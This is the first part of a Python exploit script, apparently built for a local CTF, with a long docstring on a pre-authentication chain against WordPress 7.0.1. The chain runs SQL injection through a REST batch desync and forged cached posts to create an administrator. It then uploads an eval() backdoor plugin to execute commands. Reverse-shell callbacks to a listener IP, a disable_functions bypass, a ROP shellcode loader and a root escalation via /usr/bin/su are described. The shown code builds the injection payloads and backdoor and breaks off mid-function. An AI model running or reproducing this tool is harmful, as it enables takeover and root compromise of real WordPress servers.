#!/usr/bin/env python3
"""
WP2SHELL: PRE-AUTHENTICATION RCE CHAIN FOR WORDPRESS 7.0.1
=======================================================================

Purpose and scope
-----------------

This is the complete exploit used for the local wp2shell CTF. It chains three
WordPress 7.0.1 core behaviors:

    REST batch index desynchronization
    -> reachable author_exclude / author__not_in SQL injection
    -> forged WP_Post objects in the runtime object cache
    -> a forged Customizer changeset using a discovered administrator ID
    -> a forged parse_request post-transition action
    -> reentrant REST dispatch while the current user is administrator
    -> administrator creation
    -> core plugin upload
    -> operating-system command execution

The SQL injection is not the final code-execution sink. Its important use is
turning database result rows into attacker-chosen WP_Post objects. Ordinary
WordPress post-update behavior then consumes those objects and invokes useful
core hooks. No DB FILE privilege, password cracking, secret salts, outbound
plugin download, existing vulnerable plugin, or pre-existing login is used.

The script is intentionally scoped to an explicitly supplied WordPress target.
It makes persistent changes: oEmbed cache posts, an administrator, and an
uploaded proof plugin are left on the target.

This file is the full entry point. It exposes the ordinary eval-plugin actions
(--exec-cmd and --shell), the restricted-runtime Serializable-UAF actions
(--uaf-exec, --uaf-connect, and --uaf-bash-connect), the generic native ROP
action (--pic-file), and the root helper actions (--priv-exec and
--priv-shell).

HTTPS behavior:

  * A normal HTTPS target with a publicly trusted certificate works directly.
  * For a self-signed lab certificate, pass --skip-tls-verify. This disables
    certificate verification for requests made by this Python process.
  * The oEmbed stages also make WordPress perform a server-side request to its
    own site URL. --skip-tls-verify cannot change certificate verification inside the
    target. WordPress must be able to reach and trust that URL, or the lab must
    expose an HTTP site URL usable for the embed callbacks.


1. REST batch index desynchronization
-------------------------------------

WP_REST_Server::serve_batch_request_v1() builds three parallel arrays:

  $requests    parsed WP_REST_Request objects (or WP_Error objects)
  $matches     route/handler matches
  $validation  validation results

For a path for which wp_parse_url() returns false, WordPress 7.0.1 appends a
WP_Error to $requests and $validation, but does not append a corresponding
entry to $matches. The later dispatch loop indexes all three arrays with the
same integer. One malformed entry at index zero therefore produces:

  $requests[1] dispatched with $matches[1]

but $matches[1] belongs to $requests[2]. The request object and handler have
become desynchronized. For example:

  request 0: path ":"                    -> parse error, no match entry
  request 1: POST /wp/v2/widgets?...     -> attacker-controlled carrier
  request 2: GET  /wp/v2/posts           -> posts collection handler

Request 1 is consequently processed by the handler matched for request 2.
Permissions, callback selection, and argument consumption occur against the
shifted combination.

There is an outer and an inner batch. The public batch schema normally permits
only POST, PUT, PATCH, and DELETE subrequests. The outer desync makes a widget
request object invoke the /batch/v1 handler. Because that carrier was validated
against the widget schema rather than the batch schema, its nested requests
were never constrained by the batch route's method enum. The inner batch can
therefore contain the GET /wp/v2/posts match needed below.


2. Why the desync makes the SQL injection reachable
---------------------------------------------------

The carrier path is /wp/v2/widgets with attacker-controlled query parameters.
The widget route does not define author_exclude, so it leaves the parameter as
an unsanitized string. Because of the index shift, WP_REST_Posts_Controller::
get_items() receives that widget request object. Its public-to-internal mapping
copies:

  author_exclude -> author__not_in

into WP_Query.

In vulnerable core, WP_Query sanitizes author__not_in elements when the value
is an array, but a string can reach the SQL NOT IN (...) clause directly. The
carrier therefore supplies a UNION expression through author_exclude while the
public posts handler supplies both reachability and normal response rendering.

The carrier also supplies per_page=500. Without an external object cache,
WP_Query normally splits collection queries below 500 rows into an ID-only
SELECT followed by cache priming. A 23-column UNION cannot match that
one-column projection. At exactly 500, WP_Query keeps the wp_posts.* projection,
allowing a UNION row in the physical 23-column wp_posts order. The posts REST
schema would cap per_page at 100, but the value was validated against the
widget carrier schema, not the posts schema. An external object cache forces
the split regardless of the 500-row setting and is detected by the probe.

Before using the primitive, the script sends a marker-bearing scalar UNION.
This verifies that the live request really has the expected full-row
projection. It then reads information_schema through the same SQL injection,
matches posts/options table pairs against the REST index home URL, and checks
the physical column names and order. Stock WordPress 6.x and 7.0.1 core use the
same 23-column wp_posts layout; that schema fact alone does not mean every 6.x
release has all of the vulnerable behaviors needed by this chain.


3. Creating six real cache-post IDs without authentication
----------------------------------------------------------

The script first asks the public posts/pages REST collections for a real
published permalink. It then sends six confused posts queries, each UNIONing
one synthetic public post with ID zero and one unique same-site embed
shortcode. Preparing each REST response runs the normal the_content filters,
including WP_Embed. Since ID zero is not a persistent post, WP_Embed stores a
successful result as an ordinary wp_posts row of type oembed_cache.

Theme code and filters can change the default embed width and height, which
changes WP_Embed's MD5 cache name. The script therefore does not calculate that
name. After each seed, a marker-bearing scalar SQL probe returns the actual new
row's ID, post_name, and success state. Exactly one new row is required, and a
cached {{unknown}} result produces an immediate loopback/TLS diagnostic. This
also avoids assuming that the first public post has ID 1.

The six physical oEmbed rows are assigned these logical roles:

  primary       post whose refresh starts the first hierarchy repair
  changeset     forged Customizer changeset
  primary_peer  completes the first parent cycle
  nav           valid-looking auto-draft page published by Customizer
  parse         forged parse/request transition object
  parse_peer    completes the second parent cycle


4. Turning UNION rows into forged WP_Post objects
-------------------------------------------------

The second request first runs a poison query. It returns six complete rows with
the IDs of the legitimate oEmbed cache posts but attacker-selected values for
post_type, post_status, post_content, dates, and post_parent. WP_Query primes
the in-process posts object-cache from those rows. At this point the physical
database still contains harmless oEmbed rows, while get_post(ID) in the current
PHP request returns the forged object.

A following fire query returns another synthetic ID-zero post containing only
the embed URL associated with primary. The forged primary object has a
post_modified_gmt in 2000, so WP_Embed considers it stale. A successful
same-site refresh calls:

  wp_update_post(primary, new oEmbed HTML)

wp_update_post() first loads all original fields through get_post(). It
therefore merges the innocent content update into the forged cached object.


5. First hierarchy cycle: publishing the forged changeset
----------------------------------------------------------

The forged parent graph is:

  primary -> changeset
  changeset -> primary_peer
  primary_peer -> changeset

During the primary update, wp_check_post_hierarchy_for_loops() discovers the
changeset/primary_peer cycle. To repair it, core calls wp_update_post() on the
loop members with post_parent=0. Those nested updates again preserve all fields
from the forged object cache.

The changeset object is forged as:

  post_type   = customize_changeset
  post_status = future
  post_date   = a date in the past
  post_content = attacker-selected changeset JSON

wp_insert_post() normalizes a past-dated future post to publish. The normal
transition_post_status action then calls _wp_customize_publish_changeset().


6. Customizer's temporary administrator context
-----------------------------------------------

The forged changeset contains one setting:

  nav_menus_created_posts:
    value: [ID of nav]
    type: option
    user_id: [automatically discovered administrator ID]
    date_modified_gmt: 2000-01-01 00:00:00

WP_Customize_Manager::_publish_changeset_values() trusts the stored per-setting
user_id because a legitimate changeset was expected to have passed capability
checks when it was created. The script discovers this ID by querying the
site-specific capabilities metadata, including the separate global users table
layout used by multisite. Immediately before saving that setting, core calls:

  wp_set_current_user(discovered_administrator_id)

The forged nav object looks like a registered page in auto-draft status, so
sanitize_nav_menus_created_posts() accepts it for that administrator.
save_nav_menus_created_posts() publishes it with wp_update_post().


7. Second hierarchy cycle: synthesizing parse_request
-----------------------------------------------------

The forged secondary graph is:

  nav -> parse
  parse -> parse_peer
  parse_peer -> parse

Publishing nav discovers and repairs the parse/parse_peer loop. Both loop
members are forged with:

  post_status = parse
  post_type   = request

WordPress fires the dynamic action named new_status + "_" + post_type after a
non-attachment post update, even when old and new status are identical:

  do_action("parse_request", post_id, post_object, old_status)

Core registers rest_api_loaded() on parse_request. This is the direct reentry
gadget: no eval(), system(), template inclusion, AJAX bootstrap, or plugin hook
is required.


8. Reentrant REST dispatch while the administrator is active
-------------------------------------------------------------

The global WP query still contains rest_route=/batch/v1 from the original HTTP
request. The dynamically invoked rest_api_loaded() therefore calls
WP_REST_Server::serve_request("/batch/v1") again on the already-dispatching
server.

This happens synchronously inside save_nav_menus_created_posts(), before
Customizer restores the original anonymous current user. REST cookie
authentication also preserves the already logged-in in-memory user: when the
current user is nonzero and cookie authentication was not selected,
rest_cookie_check_errors() returns without replacing that user with ID zero.

The nested serve_request() reparses the original request body as administrator.
In its shifted inner batch, a widget carrier containing generated credentials
is processed by the POST /wp/v2/users handler. The outer anonymous pass received
rest_cannot_create_user; the reentrant pass now passes create_users and creates
an administrator with the requested administrator role.

The poison UNION rows include:

  WHERE NOT EXISTS (
    SELECT 1 FROM discovered_users_table WHERE user_login = generated_username
  )

The nested admin batch creates that user before reaching the poison query, so
the poison rows are suppressed on the nested pass. In addition, hierarchy
repair has already written post_parent=0 to the critical loop member. Together
these details make the reentry one-shot instead of recursively invoking itself.

rest_api_loaded() eventually terminates with die(). That abandons the original
Customizer call stack, but all database writes made by the nested REST request,
including the new administrator, remain committed.


9. Administrator to command execution
-------------------------------------

The script verifies the generated credentials through wp-login.php, retrieves
the normal core plugin-upload nonce, creates a ZIP archive entirely in memory,
and uploads it through:

  /wp-admin/update.php?action=upload-plugin

The archive is presented as the WP2Shell proof plugin and contains a small
base64-fed PHP eval() endpoint. A plugin PHP file can be requested directly
without activating the plugin, so the script invokes the new file and verifies
its WP2SHELL marker. For an operating-system command, the
client evaluates a passthru(base64_decode(...)) snippet. The default command is:

  id

This tail needs only the ordinary WordPress administrator file-modification
path. It does not download anything from the Internet.

--exec-cmd assumes passthru is available. --shell first evaluates PHP_VERSION,
PHP_SAPI, PHP_OS, PHP_INT_SIZE, function availability, and
ini_get('disable_functions'), printing them before it decides whether to enter
the repeated HTTP command loop. The loop is entered only when
disable_functions is empty. It is not a PTY: each command is a fresh shell
process, so state such as cd and exported environment variables does not
persist automatically between commands.

For the restricted PHP-FPM lab, local_exploit.php is packaged beside this
script. It adapts Califio's PHP Serializable shared-var_hash UAF PoC: the
recursive unserialize() primitive, heap leak, Closure spray and scan, standard
module walk, disabled system-handler recovery, and fake-Closure construction
remain upstream. The PHP 8.1 adaptation adds the official binaries' negative
handler-to-EG layout, internal-function and standard-entry layouts, and a
per-request marker/prefix check that finds the live fake Closure in a
long-lived FPM heap. The final command sink is replaced with a web dispatcher
that distinguishes one-shot, PHP callback, and Bash callback actions. The
client verifies the packaged file internally. It removes the leading <?php
tag, base64-encodes the entire local source, and sends it in an HTTP POST field
named e. The endpoint evaluates it directly from memory. The action value is
separately base64-encoded in wpr_payload, so the post-exploit is not written as
another file on the target.

The restricted actions are:

  --uaf-exec COMMAND
      Execute one command through the recovered internal system handler and
      require begin/end completion markers in the HTTP response.

  --uaf-connect IPv4:PORT
      Use PHP fsockopen() for the outbound connection. The callback reads a
      command at a time, captures output from the recovered system handler with
      PHP output buffering, and sends it back through the PHP socket. Enter
      exit or quit to close it. This does not require Bash, but the originating
      HTTP request stays open while the web stack permits it. --wait changes
      only this client's wait and does not alter remote PHP or proxy settings.

  --uaf-bash-connect IPv4:PORT
      Launch a detached /bin/bash interactive shell over /dev/tcp. Its HTTP
      request returns after dispatch, but the target needs /bin/bash.

These --uaf-* options are available directly in wp2shell.py.

The separate ROP action is:

  --pic-file PATH
      Load a raw x86_64 PIC blob from PATH and execute it through
      rop_serializable.php. This path does not use the fake-Closure command
      sink and does not depend on system() or passthru(). The driver resolves
      the live PHP PIE base, gadgets, mprotect(), php_printf(), and
      _zend_bailout dynamically, then pivots into the supplied byte buffer.
      If the payload returns, the heap mapping is restored to RW and the
      client reports WP2SHELL_ROP_RETURNED. A non-returning payload may close
      the HTTP request without a completion marker.

The packaged root actions layer a small x86_64 copy-fail launcher on top of
that ROP path:

  --priv-exec COMMAND
      Load the prebuilt helper ELF and launcher template from build/. The helper
      is a compact C translation of the original /usr/bin/su Python primitive:
      it reuses the same AF_ALG chunk loop, patches /usr/bin/su in the page
      cache, and returns the root command result over an authenticated loopback
      control socket.

  --priv-shell
      Use the same helper but attach a root bash session over the same
      authenticated loopback control socket through the existing eval endpoint.

The launcher does not write the helper to /tmp. It creates an anonymous memfd,
writes the embedded helper ELF into that fd, dup2()s it to fd 197, and
execveat()s the helper directly from memory. The helper then creates a second
memfd on fd 196 for its root-stage configuration and carries both descriptors
across the setuid reentry. Root command output and root shell traffic stay in
anonymous pipes and the loopback control socket.

Build the root artifacts once before using either mode:

  $ make -C wp2root

Use --helper-elf and --launcher-pic to override the default build/
artifacts when testing a separately built helper or launcher template.
The root modes do not request an on-target trace file. The helper ELF, config
blob, command output, and shell transport stay in memory.

The upstream source declares PHP 8.0 through 8.5 NTS support. This packaged
integration is deliberately narrower: the client will use it only when system
appears in disable_functions on a 64-bit Unix PHP 8.1 NTS runtime using x86_64
or aarch64. Its additional binary-layout handling is verified against PHP
8.1.34. The Serializable interface and unserialize() must also be available.
This is a memory-corruption post-exploit, so an incompatible build or allocator
state can terminate an FPM worker even when the version number appears
supported.

The first installation uses wp2shell/wp2shell.php. A later run
probes that endpoint first and reuses it without repeating the WordPress chain.
--attach-url attaches to a supplied compatible endpoint without touching
WordPress at all. --fresh explicitly requests re-exploitation; only when the
generic path is already occupied does it select a short session-suffixed slug.


10. Relevant fixes and failure points
-------------------------------------

The chain is broken if any of its critical invariants is fixed, including:

  * keeping $requests, $matches, and $validation aligned for malformed paths;
  * parsing author__not_in through an integer ID-list sanitizer;
  * refusing serve_request() reentry while the REST server is dispatching.

These correspond to the defensive changes visible in the local 7.0.2
comparison. An external persistent object cache is also incompatible with this
specific cache-poisoning construction: it forces WP_Query's ID-only split and
may preserve real cache objects between requests. Query filters or a physically
modified wp_posts layout can likewise change the UNION projection. The script
now probes the projection, discovers the table prefix and administrator ID,
learns the actual oEmbed rows, and reports whether the changeset publication or
later reentry stopped. Administrator file modifications can still be disabled
for the final upload. --stop-after-admin stops after proving the core reentrant
administrator creation primitive.


Run example
-----------

  $ python3 wp2shell.py http://localhost:8080
  [*] Target check
  [+] Home: http://localhost:8080
  [+] WordPress: 7.0.1
  [+] SQL projection: 23 columns ('wordpress')

  [*] Site discovery
  [+] Table prefix: 'wp_'
  [+] Administrator source: user 1 in wp_users
  [+] Embed target: http://localhost:8080/?p=1

  [*] Cache preparation
  [+] Seed status: 207, 207, 207, 207, 207, 207
  [+] Cache IDs:
      primary=10, changeset=11, primary_peer=12
      nav=13, parse=14, parse_peer=15

  [*] Privilege trigger
  [+] Trigger response: HTTP 200

  [*] Administrator verification
  [+] Administrator row created
  [+] Administrator login accepted
      User:  w2s_<random>
      Pass:  <random>
      Email: w2s_<random>@example.invalid

  [*] WP2Shell installation
  [+] Plugin slug: wp2shell
  [+] Endpoint: http://localhost:8080/wp-content/plugins/wp2shell/wp2shell.php
  [*] Command: 'id'
  [+] Output:
      uid=33(www-data) gid=33(www-data) groups=33(www-data)

  [+] Command execution confirmed

Add --shell to continue with a repeated-command prompt:

  wp2shell> whoami
  www-data
  wp2shell> uname -a
  Linux ...
  wp2shell> exit

Attach to the existing endpoint without exploiting again:

  $ python3 wp2shell.py \
      --attach-url http://localhost:8080/wp-content/plugins/wp2shell/wp2shell.php

Run one command when system/passthru are in disable_functions:

  $ python3 wp2shell.py \
      --attach-url http://localhost:8083/wp-content/plugins/wp2shell/wp2shell.php \
      --uaf-exec 'id; uname -a'
  [*] Restricted command
  [+] Command: 'id; uname -a'
  [+] Payload: local_exploit.php
  [*] Action mode: cmd
  [*] Starting disable_functions bypass
  ...
  [+] WP2SHELL_SAFE_CMD_BEGIN
  uid=33(www-data) gid=33(www-data) groups=33(www-data)
  Linux ... x86_64 GNU/Linux
  [+] WP2SHELL_SAFE_CMD_END
  [+] Restricted command completed

Run a raw PIC payload through the Serializable-UAF ROP path:

  $ python3 wp2shell.py \
      --attach-url http://localhost:8083/wp-content/plugins/wp2shell/wp2shell.php \
      --pic-file ./payload.bin
  [*] Serializable ROP payload
  [+] Driver: rop_serializable.php (...)
  [+] Binary: .../payload.bin (...)
  ...
  [*] WP2SHELL_ROP_DISPATCHING
  [+] WP2SHELL_ROP_RETURNED

Run a one-shot root command through the packaged launcher:

  $ make -C wp2root
  $ python3 wp2shell.py \
      --attach-url http://localhost:8083/wp-content/plugins/wp2shell/wp2shell.php \
      --priv-exec 'id'
  [*] Root payload
  [+] Helper ELF: .../build/root_payload_helper (...)
  [+] Launcher template: .../build/root_payload_launcher.bin
  [+] Root command: 'id'
  ...
  [+] Root command output:
      uid=0(root) gid=0(root) groups=0(root)

Use the PHP-native callback (replace the example address with the listener IP):

  listener$ nc -lvnp 4444
  client$ python3 wp2shell.py --wait 240 \
      --attach-url http://target/wp-content/plugins/wp2shell/wp2shell.php \
      --uaf-connect 192.0.2.10:4444
  WP2SHELL PHP callback connected (www-data; PHP 8.1.34; fpm-fcgi)
  php-safe> id
  uid=33(www-data) gid=33(www-data) groups=33(www-data)
  php-safe> exit

Use the detached Bash callback instead:

  listener$ nc -lvnp 4444
  client$ python3 wp2shell.py \
      --attach-url http://target/wp-content/plugins/wp2shell/wp2shell.php \
      --uaf-bash-connect 192.0.2.10:4444

Start the bundled Apache/mod_php lab (it ships with a restricted
disable_functions profile) and run a restricted command against it:

  $ ./docker/setup.sh
  $ python3 wp2shell.py http://localhost:8083 --uaf-exec 'id'

Send PHP directly from curl (the PHP source does not include <?php):

  $ EVAL_URL=http://localhost:8080/wp-content/plugins/wp2shell/wp2shell.php
  $ PHP_B64=$(printf '%s' 'echo PHP_VERSION, PHP_EOL;' | base64 | tr -d '\n')
  $ curl -sS --data-urlencode "e=$PHP_B64" "$EVAL_URL"
  WP2SHELL:8.3.32

For a self-signed HTTPS lab target:

  $ python3 wp2shell.py --skip-tls-verify https://wordpress.test --shell
"""

from __future__ import annotations

import argparse
import base64
import binascii
import hashlib
import http.cookiejar
import http.client
import io
import json
import ipaddress
import pathlib
import re
import secrets
import ssl
import struct
import sys
import threading
import time
import urllib.error
import urllib.parse
import urllib.request
import zipfile


DEFAULT_BASE = "http://localhost:8080"
DEFAULT_COMMAND = "id"
OLD_DATE = "2000-01-01 00:00:00"
PLUGIN_BASE_SLUG = "wp2shell"
BROWSER_USER_AGENT = (
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
    "AppleWebKit/537.36 (KHTML, like Gecko) "
    "Chrome/126.0.0.0 Safari/537.36"
)
EVAL_MARKER = "WP2SHELL:"
EVAL_READY = "WP2SHELL_READY"
# Accept endpoints created by earlier revisions when --attach-url is explicit.
COMPAT_EVAL_MARKERS = (EVAL_MARKER, "CACHE_ANALYTICS:", "WP2SHELL_EVAL:")
LOCAL_EXPLOIT_SHA256 = "a79ba703d750c5566f6a35ca55883b239e0e728cdaca075d56780b94ca699136"
LOCAL_EXPLOIT_FILENAME = "local_exploit.php"
ROP_DRIVER_FILENAME = "rop_serializable.php"
ROP_DRIVER_SHA256 = "e196c97c26f7ca7e0b6488462bde31f8790832c3a6fad34c8b4c29c273e221d8"
ROP_MAX_PAYLOAD_SIZE = 0x10000
ROOT_BUILD_DIRNAME = "build"
ROOT_HELPER_BINARY_FILENAME = "root_payload_helper"
ROOT_LAUNCHER_FILENAME = "root_payload_launcher.bin"
ROOT_LAUNCHER_MAGIC = b"WPRLCH1\x00"
ROOT_LAUNCHER_FIELD_COUNT = 6
ROOT_RESULT_MARKER = "WP2SHELL_ROOT_RC:"
ROOT_SHELL_READY_MARKER = "WP2SHELL_ROOT_SHELL_READY"
ROOT_CONNECT_ERROR_MARKER = "WP2SHELL_ROOT_CONNECT_ERROR:"
EXPECTED_POST_COLUMNS = [
    "ID",
    "post_author",
    "post_date",
    "post_date_gmt",
    "post_content",
    "post_title",
    "post_excerpt",
    "post_status",
    "comment_status",
    "ping_status",
    "post_password",
    "post_name",
    "to_ping",
    "pinged",
    "post_modified",
    "post_modified_gmt",
    "post_content_filtered",
    "post_parent",
    "guid",
    "menu_order",
    "post_type",
    "post_mime_type",
    "comment_count",
]


class ExploitError(RuntimeError):
    """A chain precondition or a verifiable exploitation stage failed."""


def hx(value: str) -> str:
    if value == "":
        return "''"
    return "0x" + value.encode().hex()


def checked_prefix(value: str) -> str:
    """Validate a WordPress prefix before interpolating it as an identifier."""
    if not re.fullmatch(r"[A-Za-z0-9_]*", value):
        raise ExploitError(
            f"unsafe table prefix {value!r}; only letters, digits, and underscores are supported"
        )
    return value


def union_payload(rows: list[str]) -> str:
    """Return a full-row UNION while suppressing the site's legitimate rows."""
    selects = [f"SELECT {row}" for row in rows]
    return "0) AND 1=0 UNION ALL " + " UNION ALL ".join(selects) + "-- -"


def post_row(
    post_id: str,
    *,
    content: str | None = "",
    content_expr: str | None = None,
    title: str = "wp2shell",
    status: str = "publish",
    name: str = "wp2shell",
    parent: str = "0",
    post_type: str = "post",
    author: str = "1",
) -> str:
    """Return the 23 expressions matching the physical wp_posts column order."""
    if content_expr is None:
        content_expr = hx(content or "")
    fields = [
        post_id,                 # ID
        author,                  # post_author
        hx(OLD_DATE),            # post_date
        hx(OLD_DATE),            # post_date_gmt
        content_expr,            # post_content
        hx(title),               # post_title
        hx(""),                  # post_excerpt
        hx(status),              # post_status
        hx("closed"),            # comment_status
        hx("closed"),            # ping_status
        hx(""),                  # post_password
        hx(name),                # post_name
        hx(""),                  # to_ping
        hx(""),                  # pinged
        hx(OLD_DATE),            # post_modified
        hx(OLD_DATE),            # post_modified_gmt
        hx(""),                  # post_content_filtered
        parent,                  # post_parent
        hx(""),                  # guid
        "0",                    # menu_order
        hx(post_type),           # post_type
        hx(""),                  # post_mime_type
        "0",                    # comment_count
    ]
    assert len(fields) == 23
    return ",".join(fields)


def query_path(route: str, **params: str) -> str:
    return route + "?" + urllib.parse.urlencode(params)


def malformed() -> dict:
    # wp_parse_url(':') returns false. In 7.0.1 this is appended to $requests
    # but not $matches, shifting every subsequent request/handler pairing.
    return {"method": "POST", "path": ":"}


def widget_carrier(payload: str, body: dict | None = None) -> dict:
    carrier_body = {"sidebar": "wp_inactive_widgets"}
    if body:
        carrier_body.update(body)
    return {
        "method": "POST",
        "path": query_path(
            "/wp/v2/widgets",
            # WP_Query splits collection queries into an ID-only SELECT when
            # posts_per_page < 500. Exactly 500 keeps the 23-column wp_posts.*
            # projection needed for object-cache poisoning. This value is on
            # the widget carrier, so the posts REST schema never caps it at 100.
            per_page="500",
            orderby="none",
            author_exclude=payload,
        ),
        "body": carrier_body,
    }


def wrap_inner(inner: list[dict]) -> dict:
    """Use an outer desync so a widget carrier invokes /batch/v1."""
    return {
        "requests": [
            malformed(),
            {
                "method": "POST",
                "path": "/wp/v2/widgets",
                "body": {
                    "sidebar": "wp_inactive_widgets",
                    "requests": inner,
                },
            },
            {"method": "POST", "path": "/batch/v1"},
        ]
    }


class Target:
    def __init__(self, base: str, timeout: int = 120, insecure: bool = False):
        self.base = base.rstrip("/")
        self.timeout = timeout
        self.insecure = insecure
        self.ssl_context = (
            ssl._create_unverified_context() if insecure else ssl.create_default_context()
        )

    def request(self, url: str, data: bytes | None = None, headers: dict | None = None):
        request_headers = {"User-Agent": BROWSER_USER_AGENT}
        if headers:
            request_headers.update(headers)
        request = urllib.request.Request(url, data=data, headers=request_headers)
        try:
            return urllib.request.urlopen(
                request, timeout=self.timeout, context=self.ssl_context
            )
        except urllib.error.HTTPError as exc:
            return exc

    def rest_index(self) -> dict:
        response = self.request(f"{self.base}/index.php?rest_route=/")
        body = response.read().decode("utf-8", "replace")
        try:
            index = json.loads(body)
        except json.JSONDecodeError as exc:
            raise ExploitError(
                f"the public REST index returned HTTP {response.getcode()} but not JSON: {body[:300]!r}"
            ) from exc
        if not isinstance(index, dict):
            raise ExploitError("the public REST index was not a JSON object")
        return index

    def detect_wordpress_version(self, site_home: str) -> str | None:
        """Best-effort public version detection without making it a prerequisite."""
        urls = [
            site_home.rstrip("/") + "/",
            site_home.rstrip("/") + "/?feed=rss2",
            site_home.rstrip("/") + "/readme.html",
        ]
        patterns = [
            r"WordPress(?:\.org)?[ /?&;=v]*([0-9]+(?:\.[0-9]+){1,3}(?:[-.][A-Za-z0-9]+)?)",
            r"wp-includes/[^\"']+[?&](?:amp;)?ver=([0-9]+(?:\.[0-9]+){1,3})",
            r"Version\s+([0-9]+(?:\.[0-9]+){1,3})",
        ]
        for url in urls:
            try:
                response = self.request(url)
                body = response.read().decode("utf-8", "replace")
            except (OSError, urllib.error.URLError):
                continue
            for pattern in patterns:
                match = re.search(pattern, body, re.I)
                if match:
                    return match.group(1)
        return None

    def public_content_link(self) -> str:
        """Find a real public post/page whose URL can be consumed by oEmbed."""
        for route in ("/wp/v2/posts", "/wp/v2/pages"):
            query = urllib.parse.urlencode(
                {"rest_route": route, "per_page": "1", "_fields": "id,link"}
            )
            response = self.request(f"{self.base}/index.php?{query}")
            body = response.read().decode("utf-8", "replace")
            try:
                items = json.loads(body)
            except json.JSONDecodeError:
                continue
            if not isinstance(items, list):
                continue
            for item in items:
                if isinstance(item, dict) and isinstance(item.get("link"), str):
                    return item["link"]
        raise ExploitError(
            "no public post or page was exposed by the REST API; the oEmbed trigger needs one"
        )

    def batch(self, body: dict) -> tuple[int, str]:
        raw = json.dumps(body, separators=(",", ":")).encode()
        response = self.request(
            f"{self.base}/index.php?rest_route=/batch/v1",
            raw,
            {"Content-Type": "application/json"},
        )
        return response.getcode(), response.read().decode("utf-8", "replace")

    def admin_session(self, username: str, password: str):
        # Redirect suppression lets us inspect the auth cookie on WP's 302.
        class NoRedirect(urllib.request.HTTPRedirectHandler):
            def redirect_request(self, *args, **kwargs):
                return None

        jar = http.cookiejar.CookieJar()
        opener = urllib.request.build_opener(
            NoRedirect(),
            urllib.request.HTTPCookieProcessor(jar),
            urllib.request.HTTPSHandler(context=self.ssl_context),
        )
        opener.addheaders = [("User-Agent", BROWSER_USER_AGENT)]
        data = urllib.parse.urlencode(
            {
                "log": username,
                "pwd": password,
                "wp-submit": "Log In",
                "redirect_to": f"{self.base}/wp-admin/",
                "testcookie": "1",
            }
        ).encode()
        request = urllib.request.Request(
            f"{self.base}/wp-login.php", data=data,
            headers={"Cookie": "wordpress_test_cookie=WP Cookie check"},
        )
        try:
            opener.open(request, timeout=self.timeout)
        except urllib.error.HTTPError:
            pass
        if any("wordpress_logged_in" in cookie.name for cookie in jar):
            return opener
        return None

    def public_opener(self):
        opener = urllib.request.build_opener(
            urllib.request.HTTPSHandler(context=self.ssl_context),
        )
        opener.addheaders = [("User-Agent", BROWSER_USER_AGENT)]
        return opener

    def login_works(self, username: str, password: str) -> bool:
        return self.admin_session(username, password) is not None

    @staticmethod
    def _open_with_errors(opener, request, timeout: int):
        try:
            return opener.open(request, timeout=timeout)
        except urllib.error.HTTPError as exc:
            return exc

    def upload_eval_shell(
        self,
        opener,
        plugin_slug: str,
    ) -> tuple[bool, str]:
        nonce_page = self._open_with_errors(
            opener,
            f"{self.base}/wp-admin/plugin-install.php?tab=upload",
            self.timeout,
        ).read().decode("utf-8", "replace")
        nonce_match = re.search(
            r'name=["\']_wpnonce["\'][^>]*value=["\']([0-9a-z]+)["\']',
            nonce_page,
            re.I,
        )
        if not nonce_match:
            return False, "plugin-upload nonce was not present"

        plugin_php = (
            "<?php\n"
            "/* Plugin Name: WP2Shell */\n"
            "/* Description: WP2Shell proof endpoint. */\n"
            "if (isset($_REQUEST['e'])) {\n"
            "  header('Content-Type: text/plain; charset=utf-8');\n"
            f"  echo '{EVAL_MARKER}';\n"
            "  eval(base64_decode((string) $_REQUEST['e']));\n"
            "  exit;\n"
            "}\n"
        )
        archive = io.BytesIO()
        with zipfile.ZipFile(archive, "w", zipfile.ZIP_DEFLATED) as zipped:
            zipped.writestr(f"{plugin_slug}/{plugin_slug}.php", plugin_php)

        boundary = "----WebKitFormBoundary" + secrets.token_hex(8)
        chunks: list[bytes] = []
        for name, value in (
            ("_wpnonce", nonce_match.group(1)),
            ("_wp_http_referer", "/wp-admin/plugin-install.php?tab=upload"),
            ("install-plugin-submit", "Install Now"),
        ):
            chunks.append(
                (
                    f"--{boundary}\r\n"
                    f'Content-Disposition: form-data; name="{name}"\r\n\r\n'
                    f"{value}\r\n"
                ).encode()
            )
        chunks.append(
            (
                f"--{boundary}\r\n"
                'Content-Disposition: form-data; name="pluginzip"; '
                f'filename="{plugin_slug}.zip"\r\n'
                "Content-Type: application/zip\r\n\r\n"
            ).encode()
        )
        chunks.append(archive.getvalue())
        chunks.append(f"\r\n--{boundary}--\r\n".encode())

        upload_request = urllib.request.Request(
            f"{self.base}/wp-admin/update.php?action=upload-plugin",
            data=b"".join(chunks),
            headers={"Content-Type": f"multipart/form-data; boundary={boundary}"},
        )
        upload_response = self._open_with_errors(
            opener, upload_request, self.timeout
        )
        upload_html = upload_response.read().decode("utf-8", "replace")

        eval_ok, eval_output = self.run_php_code(
            opener, plugin_slug, f"echo '{EVAL_READY}';"
        )
        if not eval_ok or EVAL_READY not in eval_output:
            summary = re.sub(r"<[^>]+>", " ", upload_html)
            summary = " ".join(summary.split())[:600]
            return False, f"{summary}; eval endpoint response: {eval_output[:300]}"
        return True, upload_html

    def eval_url(self, plugin_slug: str) -> str:
        return f"{self.base}/wp-content/plugins/{plugin_slug}/{plugin_slug}.php"

    def _request_eval_url(
        self,
        opener,
        eval_url: str,
        php_code: str,
        *,
        request_parameters: dict[str, str] | None = None,
        use_post: bool = False,
        request_timeout: float | int | None = None,
    ) -> tuple[int, str]:
        encoded = base64.b64encode(php_code.encode()).decode("ascii")
        parameters = {"e": encoded}
        if request_parameters:
            parameters.update(request_parameters)
        encoded_parameters = urllib.parse.urlencode(parameters)
        if use_post:
            request = urllib.request.Request(
                eval_url,
                data=encoded_parameters.encode(),
                headers={"Content-Type": "application/x-www-form-urlencoded"},
            )
        else:
            request = eval_url + ("&" if "?" in eval_url else "?") + encoded_parameters
        shell_response = self._open_with_errors(
            opener,
            request,
            self.timeout if request_timeout is None else request_timeout,
        )
        try:
            shell_bytes = shell_response.read()
        except http.client.IncompleteRead as exc:
            shell_bytes = exc.partial
        shell_body = shell_bytes.decode("utf-8", "replace")
        return shell_response.getcode(), shell_body

    def run_php_url(
        self,
        opener,
        eval_url: str,
        php_code: str,
        *,
        request_parameters: dict[str, str] | None = None,
        use_post: bool = False,
        request_timeout: float | int | None = None,
    ) -> tuple[bool, str]:
        _, shell_body = self._request_eval_url(
            opener,
            eval_url,
            php_code,
            request_parameters=request_parameters,
            use_post=use_post,
